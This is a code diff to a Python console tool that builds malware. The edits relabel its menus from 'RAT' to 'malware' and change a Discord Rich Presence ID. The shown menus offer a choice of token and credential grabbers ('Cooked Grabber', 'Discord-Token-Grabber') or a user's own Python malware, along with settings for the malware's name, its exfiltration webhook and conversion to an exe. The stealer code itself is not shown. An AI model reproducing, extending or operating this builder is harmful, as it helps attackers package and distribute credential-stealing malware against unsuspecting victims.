@@ -16,7 +16,7 @@ from pypresence import Presence
 
 def rich_presence():
     try:
-        rpc = Presence("691934102307340298")
+        rpc = Presence("1108425762232606790")
         rpc.connect()
         rpc.update(
             large_image= "resolution_logo",
@@ -133,8 +133,8 @@ def choice_rat(banner, w, m):
     while True:
         os.system("cls")
         print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} RAT Choice:\n")
-        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}3{m}]{w} Select your own RAT")
+        print(f" {m}[{w}+{m}]{w} Malware choice:\n")
+        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}3{m}]{w} Select your own py malware")
         print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}4{m}]{w} Back to home")
         choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
         
@@ -151,7 +151,7 @@ def choice_rat(banner, w, m):
             update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
             update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
             os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Token grabber by Astraadev !")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Token grabber by Astraadev !")
             time.sleep(3)
         
         elif choice_rat == "3":
@@ -163,7 +163,7 @@ def choice_rat(banner, w, m):
             update_json("path", path)
             update_json("requirements", req )
             os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: {os.path.basename(path)} !")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: {os.path.basename(path)} !")
             time.sleep(3)
         
         elif choice_rat == "4":
@@ -186,7 +186,7 @@ def exe_settings(banner, w, m):
             if res == "y":
                 update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
                 os.system("cls")
-                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your RAT will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
+                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your malware will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
                 time.sleep(3)
 
         elif choice_exe == "2":
@@ -227,7 +227,7 @@ def settings_menu(banner, w, m):
     while True:
         os.system("cls")
         print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} RAT Setup:\n")
+        print(f" {m}[{w}+{m}]{w} Malware setup:\n")
         print(f" {m}[{w}1{m}]{w} Select your malware    | {m}[{w}4{m}]{w} EXE settings")
         print(f" {m}[{w}2{m}]{w} Change malware name    | {m}[{w}5{m}]{w} Back to home")
         print(f" {m}[{w}3{m}]{w} Change malware webhook")
@@ -332,7 +332,7 @@ def builder(banner, m, w):
     except Exception as e:
         input(e)
         os.system("cls")
-        input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the rat!")
+        input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the malware!")
         
 
 def main():
